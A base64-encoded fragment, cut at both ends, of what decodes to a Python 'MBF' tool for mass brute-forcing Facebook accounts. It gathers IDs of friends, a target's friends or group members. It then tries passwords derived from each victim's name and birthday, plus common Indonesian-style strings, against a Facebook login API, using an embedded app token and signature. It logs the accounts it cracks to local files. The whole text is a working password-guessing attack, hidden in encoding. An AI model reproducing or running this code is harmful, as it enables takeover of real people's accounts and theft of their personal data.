NbMTs5N21CYWNrIFwwMzNbMTs5MW1dIikNCgkJbWVudV9oYWNrKCkNCg0KZGVmIHNjcmFrKCk6DQoJZ2xvYmFsIHN1Y2Vzc2Z1bCxjaGVja3BvaW50LGFjdGlvbl9mYWlsZWQsYmFjayx1cA0KCXRyeToNCgkJb3MubWtkaXIoJ291dCcpDQoJZXhjZXB0IE9TRXJyb3I6DQoJCXBhc3MNCgl0cnk6DQoJCW9wZW5faXQgPSBvcGVuKGlkbGlzdCwgInIiKQ0KCQl1cCA9IG9wZW5faXQucmVhZCgpLnNwbGl0KCkNCgkJd2hpbGUgZmlsZToNCgkJCXVzZXJuYW1lID0gZmlsZS5yZWFkbGluZSgpLnN0cmlwKCkNCgkJCXVybCA9ICJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcm5hbWUpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3N3KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2Ig0KCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKHVybCkNCgkJCW1wc2ggPSBqc29uLmxvYWQoZGF0YSkNCgkJCWlmIGJhY2sgPT0gKGxlbih1cCkpOg0KCQkJCWJyZWFrDQoJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBtcHNoOg0KCQkJCWJpc2EgPSBvcGVuKCJvdXQvbWJmX29rLnR4dCIsICJ3IikNCgkJCQliaXNhLndyaXRlKHVzZXJuYW1lKyJ8IitwYXNzdysiXG4iKQ0KCQkJCWJpc2EuY2xvc2UoKQ0KCQkJCXggPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIrdXNlcm5hbWUrIj9hY2Nlc3NfdG9rZW49IittcHNoWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpDQoJCQkJc3VjZXNzZnVsLmFwcGVuZCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybU9L4pyTXDAzM1sxOzk3bSBdICIrdXNlcm5hbWUrInwiICtwYXNzdysiID0+Iit6WyduYW1lJ10pDQoJCQllbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWyJlcnJvcl9tc2ciXToNCgkJCQljaGVja19pdCA9IG9wZW4oIm91dC9tYmZfY3AudHh0IiwgInciKQ0KCQkJCWNoZWNrX2l0LndyaXRlKHVzZXJuYW1lKyJ8IitwYXNzdysiXG4iKQ0KCQkJCWNoZWNrX2l0LmNsb3NlKCkNCgkJCQljaGVja3BvaW50LmFwcGVuZCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkzbUNQ4pyaXDAzM1sxOzk3bSBdICIrdXNlcm5hbWUrInwiICtwYXNzdykNCgkJCWVsc2U6DQoJCQkJYWN0aW9uX2ZhaWxlZC5hcHBlbmQodXNlcm5hbWUpDQoJCQkJYmFjayArPTENCgkJCXN5cy5zdGRvdXQud3JpdGUoJ1xyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4py4XDAzM1sxOzkxbV0gXDAzM1sxOzkybUNyYWNrICAgIFwwMzNbMTs5MW06XDAzM1sxOzk3bSAnK3N0cihiYWNrKSsnIFwwMzNbMTs5Nm0+XDAzM1sxOzk3bSAnK3N0cihsZW4odXApKSsnID0+XDAzM1sxOzkybUxpdmVcMDMzWzE7OTFtOlwwMzNbMTs5Nm0nK3N0cihsZW4oc3VjZXNzZnVsKSkrJyBcMDMzWzE7OTdtPT5cMDMzWzE7OTNtQ2hlY2tcMDMzWzE7OTFtOlwwMzNbMTs5Nm0nK3N0cihsZW4oY2hlY2twb2ludCkpKTtzeXMuc3Rkb3V0LmZsdXNoKCkNCglleGNlcHQgSU9FcnJvcjoNCgkJcHJpbnQiXG5cMDMzWzE7OTFtWyFdIFNsZWVwIg0KCQl0aW1lLnNsZWVwKDAuMDEpDQoJZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtW+Kcll0gTm8gY29ubmVjdGlvbiINCg0KZGVmIHN1Y2Nlc3MoKToNCglwcmludA0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCSMjI3N1Y2Vzc2Z1bA0KCWZvciBiIGluIHN1Y2Vzc2Z1bDoNCgkJcHJpbnQoYikNCgkjIyNDSEVDSw0KCWZvciBjIGluIGNoZWNrcG9pbnQ6DQoJCXByaW50KGMpDQoJIyMjYWN0aW9uX2ZhaWxlZA0KCXByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KCXByaW50ICgiXDAzM1szMW1beF0gRmFpbGVkIFwwMzNbMTs5N20tLT4gIiArIHN0cihsZW4oYWN0aW9uX2ZhaWxlZCkpKQ0KCWV4aXQoKQ0KDQojIyMjIyMjIyMjIyMjIyMgU1VQRVIgTUJGICMjIyMjIyMjIyMjIyMjIyMNCmRlZiBzdXBlcigpOg0KCWdsb2JhbCBmYl90b2tlbg0KCW9zLnN5c3RlbSgnY2xlYXInKQ0KCXRyeToNCgkJZmJfdG9rZW49b3BlbignbG9naW4udHh0JywncicpLnJlYWQoKQ0KCWV4Y2VwdCBJT0Vycm9yOg0KCQlwcmludCJcMDMzWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCINCgkJb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykNCgkJdGltZS5zbGVlcCgwLjApDQoJCWxvZ2luKCkNCglvcy5zeXN0ZW0oJ2NsZWFyJykNCglwcmludCBsb2dvDQoJcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm0xLlwwMzNbMTs5N20gQ3JhY2sgd2l0aCBsaXN0IGZyaWVuZCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTIuXDAzM1sxOzk3bSBDcmFjayBmcm9tIGZyaWVuZCINCglwcmludCAiXDAzM1sxOzk3beKVkS0tXDAzM1sxOzkxbT4gXDAzM1sxOzkybTMuXDAzM1sxOzk3bSBDcmFjayBmcm9tIG1lbWJlciBncm91cCINCiAgICAgICAgcHJpbnQgIlwwMzNbMTs5N23ilZEtLVwwMzNbMTs5MW0+IFwwMzNbMTs5Mm00LlwwMzNbMTs5N20gQ3JhY2sgZnJvbSBGaWxlIg0KCXByaW50ICJcMDMzWzE7OTdt4pWRLS1cMDMzWzE7OTFtPiBcMDMzWzE7OTFtMC5cMDMzWzE7OTdtIEJhY2siDQoJcHJpbnQgIuKVkSINCgljaG9pY2VzX3N1cGVyKCkNCg0KZGVmIGNob2ljZXNfc3VwZXIoKToNCglwZWFrID0gcmF3X2lucHV0KCJcMDMzWzE7OTdt4pWa4pWQXDAzM1sxOzkxbT4+PiBcMDMzWzE7OTdtIikNCglpZiBwZWFrID09IiI6DQoJCXByaW50ICJcMDMzWzE7OTFtWyFdIFdyb25nIGlucHV0Ig0KCQljaG9pY2VzX3N1cGVyKCkNCgllbGlmIHBlYWsgPT0iMSI6DQoJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQlwcmludCBsb2dvDQoJCW1rZGlyKCdcMDMzWzE7OTFtW+Kcul0gXDAzM1sxOzkybUdldCBhbGwgZnJpZW5kIGlkIFwwMzNbMTs5N20uLi4nKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0iK2ZiX3Rva2VuKQ0KCQl6ID0ganNvbi5sb2FkcyhyLnRleHQpDQoJCWZvciBzIGluIHpbJ2RhdGEnXToNCgkJCWlkLmFwcGVuZChzWydpZCddKQ0KCWVsaWYgcGVhayA9PSIyIjoNCgkJb3Muc3lzdGVtKCdjbGVhcicpDQoJCXByaW50IGxvZ28NCgkJaWR0ID0gcmF3X2lucHV0KCJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBmcmllbmQgXDAzM1sxOzkxbTogXDAzM1sxOzk3bSIpDQoJCXRyeToNCgkJCXNlYXQgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyIraWR0KyI/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCQlvcCA9IGpzb24ubG9hZHMoc2VhdC50ZXh0KQ0KCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb21cMDMzWzE7OTFtIDpcMDMzWzE7OTdtICIrb3BbIm5hbWUiXQ0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlwcmludCJcMDMzWzE7OTFtWyFdIEZyaWVuZCBub3QgZm91bmQiDQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJc3VwZXIoKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgYWxsIGlkIGZyb20gZnJpZW5kIFwwMzNbMTs5N20uLi4nKQ0KCQlyID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK2lkdCsiL2ZyaWVuZHM/YWNjZXNzX3Rva2VuPSIrZmJfdG9rZW4pDQoJCXogPSBqc29uLmxvYWRzKHIudGV4dCkNCgkJZm9yIGkgaW4gelsnZGF0YSddOg0KCQkJaWQuYXBwZW5kKGlbJ2lkJ10pDQoJZWxpZiBwZWFrID09IjMiOg0KCQlvcy5zeXN0ZW0oJ2NsZWFyJykNCgkJcHJpbnQgbG9nbw0KCQlpZGc9cmF3X2lucHV0KCdcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1JbnB1dCBJRCBncm91cCBcMDMzWzE7OTFtOlwwMzNbMTs5N20gJykNCgkJdHJ5Og0KCQkJcj1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL2dyb3VwLz9pZD0nK2lkZysnJmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQkJYXN3PWpzb24ubG9hZHMoci50ZXh0KQ0KCQkJcHJpbnQiXDAzM1sxOzkxbVtcMDMzWzE7OTZt4pyTXDAzM1sxOzkxbV0gXDAzM1sxOzkybUZyb20gZ3JvdXAgXDAzM1sxOzkxbTpcMDMzWzE7OTdtICIrYXN3WyduYW1lJ10NCgkJZXhjZXB0IEtleUVycm9yOg0KCQkJcHJpbnQiXDAzM1sxOzkxbVshXSBHcm91cCBub3QgZm91bmQiDQoJCQlyYXdfaW5wdXQoIlxuXDAzM1sxOzkxbVsgXDAzM1sxOzk3bUJhY2sgXDAzM1sxOzkxbV0iKQ0KCQkJc3VwZXIoKQ0KCQlta2RpcignXDAzM1sxOzkxbVvinLpdIFwwMzNbMTs5Mm1HZXQgZ3JvdXAgbWVtYmVyIGlkIFwwMzNbMTs5N20uLi4nKQ0KCQlyZT1yZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycraWRnKycvbWVtYmVycz9maWVsZHM9bmFtZSxpZCZsaW1pdD05OTk5OTk5OTk5OTk5JmFjY2Vzc190b2tlbj0nK2ZiX3Rva2VuKQ0KCQlzPWpzb24ubG9hZHMocmUudGV4dCkNCgkJZm9yIHAgaW4gc1snZGF0YSddOg0KCQkJaWQuYXBwZW5kKHBbJ2lkJ10pDQogICAgICAgIGVsaWYgcGVhayA9PSAiNCI6DQogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgICAgICAgICAgcHJpbnQgbG9nbw0KICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIGlkbGlzdCA9IHJhd19pbnB1dCgnXDAzM1sxOzkxbVsrXSBcMDMzWzE7OTJtRmlsZSBJRCAgXDAzM1sxOzkxbTogXDAzM1sxOzk3bScpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBvcGVuKGlkbGlzdCwncicpLnJlYWRsaW5lcygpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZC5hcHBlbmQobGluZS5zdHJpcCgpKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdcMDMzWzE7OTFtWyFdIEZpbGUgbm90IGZvdW5kJw0KICAgICAgICAgICAgICAgICAgICAgICAgcmF3X2lucHV0KCdcblwwMzNbMTs5MW1bIFwwMzNbMTs5N21CYWNrIFwwMzNbMTs5MW1dJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHN1cGVyKCkNCgllbGlmIHBlYWsgPT0iMCI6DQoJCW1lbnVfaGFjaygpDQoJZWxzZToNCgkJcHJpbnQgIlwwMzNbMTs5MW1bIV0gV3JvbmcgaW5wdXQiDQoJCWNob2ljZXNfc3VwZXIoKQ0KDQogICAgICAgIHByaW50ICJcMDMzWzE7OTFtWytdIFwwMzNbMTs5Mm1Ub3RhbCBJRCBcMDMzWzE7OTFtOiBcMDMzWzE7OTdtIitzdHIobGVuKGlkKSkNCiAgICAgICAgbWtkaXIoJ1wwMzNbMTs5MW1b4py6XSBcMDMzWzE7OTJtU3RhcnQgXDAzM1sxOzk3bS4uLicpDQoJdGlsb2FkID0gWycuICAgJywnLi4gICcsJy4uLiAnXQ0KCWZvciBvIGluIHRpbG9hZDoNCgkJcHJpbnQoIlxyXDAzM1sxOzkxbVtcMDMzWzE7OTZt4py4XDAzM1sxOzkxbV0gXDAzM1sxOzkybUNyYWNrIFwwMzNbMTs5N20iK28pLDtzeXMuc3Rkb3V0LmZsdXNoKCk7dGltZS5zbGVlcCgxKQ0KCXByaW50DQogICAgICAgIHByaW50IDQyKiJcMDMzWzE7OTdt4pWQIg0KDQoNCgkjIyMjIyBjcmFjayAjIyMjIw0KCWRlZiBtYWluKGFyZyk6DQoJCWdsb2JhbCBjaGVja3BvaW50LG9rcw0KCQl1c2VyID0gYXJnDQoJCXRyeToNCgkJCW9zLm1rZGlyKCdvdXQnKQ0KCQlleGNlcHQgT1NFcnJvcjoNCgkJCXBhc3MNCgkJdHJ5Og0KCQkJI1Bhc3MxDQoJCQlhID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8nK3VzZXIrJy8/YWNjZXNzX3Rva2VuPScrZmJfdG9rZW4pDQoJCQliID0ganNvbi5sb2FkcyhhLnRleHQpDQoJCQlwYXNzMSA9IGJbJ2ZpcnN0X25hbWUnXSsnMTIzJw0KCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczEpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJcSA9IGpzb24ubG9hZChkYXRhKQ0KCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQl6ID0ganNvbi5sb2Fkcyh4LnRleHQpDQoJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczErIiA9PiIrelsnbmFtZSddKQ0KCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMSkNCgkJCWVsc2U6DQoJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQ0KCQkJCQljaGVja19pdC53cml0ZSh1c2VyKyJ8IitwYXNzMSsiXG4iKQ0KCQkJCQljaGVja19pdC5jbG9zZSgpDQoJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczEpDQoJCQkJZWxzZToNCgkJCQkJI1Bhc3MyDQoJCQkJCXBhc3MyID0gYlsnZmlyc3RfbmFtZSddKycxMjM0NScNCgkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczIpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3MyKyIgPT4iK3pbJ25hbWUnXSkNCgkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzMikNCgkJCQkJZWxzZToNCgkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQ0KCQkJCQkJCWNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3MyKyJcbiIpDQoJCQkJCQkJY2hlY2tfaXQuY2xvc2UoKQ0KCQkJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczIpDQoJCQkJCQllbHNlOg0KCQkJCQkJCSNQYXNzMw0KCQkJCQkJCXBhc3MzID0gYlsnbGFzdF9uYW1lJ10gKyAnMTIzJw0KCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3MzKSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJaWYgJ2FjY2Vzc190b2tlbicgaW4gcToNCgkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pDQoJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCQkJCQkJcHJpbnQoIlwwMzNbMTs5N21bIFwwMzNbMTs5Mm3inJNcMDMzWzE7OTdtIF0gIit1c2VyKyJ8IiArcGFzczMrIiA9PiIrelsnbmFtZSddKQ0KCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczMpDQoJCQkJCQkJZWxzZToNCgkJCQkJCQkJaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbImVycm9yX21zZyJdOg0KCQkJCQkJCQkJY2hlY2tfaXQgPSBvcGVuKCJvdXQvb3V0cHV0LnR4dCIsICJhIikNCgkJCQkJCQkJCWNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3MzKyJcbiIpDQoJCQkJCQkJCQljaGVja19pdC5jbG9zZSgpDQoJCQkJCQkJCQljaGVja3BvaW50LmFwcGVuZCh1c2VyK3Bhc3MzKQ0KCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJI1Bhc3M0DQoJCQkJCQkJCQltb2RlID0gYlsnYmlydGhkYXknXQ0KCQkJCQkJCQkJcGFzczQgPSBtb2RlLnJlcGxhY2UoJy8nLCAnJykNCgkJCQkJCQkJCWRhdGEgPSB1cmxsaWIudXJsb3BlbigiaHR0cHM6Ly9iLWFwaS5mYWNlYm9vay5jb20vbWV0aG9kL2F1dGgubG9naW4/YWNjZXNzX3Rva2VuPTIzNzc1OTkwOTU5MTY1NSUyNTI1N0MwZjE0MGFhYmVkZmI2NWFjMjdhNzM5ZWQxYTIyNjNiMSZmb3JtYXQ9anNvbiZzZGtfdmVyc2lvbj0yJmVtYWlsPSIrKHVzZXIpKyImbG9jYWxlPWVuX1VTJnBhc3N3b3JkPSIrKHBhc3M0KSsiJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2IikNCgkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJeCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vIit1c2VyKyI/YWNjZXNzX3Rva2VuPSIrcVsnYWNjZXNzX3Rva2VuJ10pDQoJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJCQkJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3M0KyIgPT4iK3pbJ25hbWUnXSkNCgkJCQkJCQkJCQlva3MuYXBwZW5kKHVzZXIrcGFzczQpDQoJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQkJCQkJY2hlY2tfaXQgPSBvcGVuKCJvdXQvb3V0cHV0LnR4dCIsICJhIikNCgkJCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczQrIlxuIikNCgkJCQkJCQkJCQkJY2hlY2tfaXQuY2xvc2UoKQ0KCQkJCQkJCQkJCQljaGVja3BvaW50LmFwcGVuZCh1c2VyK3Bhc3M0KQ0KCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCSNQYXNzNQ0KCQkJCQkJCQkJCQlwYXNzNSA9ICJzYXlhbmcxMjMiLCJzYXlhbmdrdTEyMyINCgkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczUpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQlxID0ganNvbi5sb2FkKGRhdGEpDQoJCQkJCQkJCQkJCWlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCXogPSBqc29uLmxvYWRzKHgudGV4dCkNCgkJCQkJCQkJCQkJCXByaW50KCJcMDMzWzE7OTdtWyBcMDMzWzE7OTJt4pyTXDAzM1sxOzk3bSBdICIrdXNlcisifCIgK3Bhc3M1KyIgPT4iK3pbJ25hbWUnXSkNCgkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNSkNCgkJCQkJCQkJCQkJZWxzZToNCgkJCQkJCQkJCQkJCWlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWyJlcnJvcl9tc2ciXToNCgkJCQkJCQkJCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCWNoZWNrX2l0LndyaXRlKHVzZXIrInwiK3Bhc3M1KyJcbiIpDQoJCQkJCQkJCQkJCQkJY2hlY2tfaXQuY2xvc2UoKQ0KCQkJCQkJCQkJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczUpDQoJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCSNQYXNzNg0KCQkJCQkJCQkJCQkJCXBhc3M2ID0gImJpbnRhbmcxMjMiLCJiaW50YW5nMTIzNDUiDQoJCQkJCQkJCQkJCQkJZGF0YSA9IHVybGxpYi51cmxvcGVuKCJodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTImZW1haWw9IisodXNlcikrIiZsb2NhbGU9ZW5fVVMmcGFzc3dvcmQ9IisocGFzczYpKyImc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYiKQ0KCQkJCQkJCQkJCQkJCXEgPSBqc29uLmxvYWQoZGF0YSkNCgkJCQkJCQkJCQkJCQlpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KCQkJCQkJCQkJCQkJCQl4ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iK3VzZXIrIj9hY2Nlc3NfdG9rZW49IitxWydhY2Nlc3NfdG9rZW4nXSkNCgkJCQkJCQkJCQkJCQkJeiA9IGpzb24ubG9hZHMoeC50ZXh0KQ0KCQkJCQkJCQkJCQkJCQlwcmludCgiXDAzM1sxOzk3bVsgXDAzM1sxOzkybeKck1wwMzNbMTs5N20gXSAiK3VzZXIrInwiICtwYXNzNisiID0+Iit6WyduYW1lJ10pDQoJCQkJCQkJCQkJCQkJCW9rcy5hcHBlbmQodXNlcitwYXNzNikNCgkJCQkJCQkJCQkJCQllbHNlOg0KCQkJCQkJCQkJCQkJCQlpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsiZXJyb3JfbXNnIl06DQoJCQkJCQkJCQkJCQkJCQljaGVja19pdCA9IG9wZW4oIm91dC9vdXRwdXQudHh0IiwgImEiKQ0KCQkJCQkJCQkJCQkJCQkJY2hlY2tfaXQud3JpdGUodXNlcisifCIrcGFzczYrIlxuIikNCgkJCQkJCQkJCQkJCQkJCWNoZWNrX2l0LmNsb3NlKCkNCgkJCQkJCQkJCQkJCQkJCWNoZWNrcG9pbnQuYXBwZW5kKHVzZXIrcGFzczYpDQoJCQkJCQkJCQkJCQkJCWVsc2U6DQoJCQkJCQkJCQkJCQkJCQkjUGFzczcNCgkJCQkJCQkJCQkJCQkJCWEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLycrdXNlcisnLz9hY2Nlc3NfdG9rZW49JytmYl90b2tlbikNCgkJCQkJCQkJCQkJCQkJCWIgPSBqc29uLmxvYWRzKGEudGV4dCkNCgkJCQkJCQkJCQkJCQkJCXBhc3M3ID0gIjEyMzQ1Njc4OTAiLCJ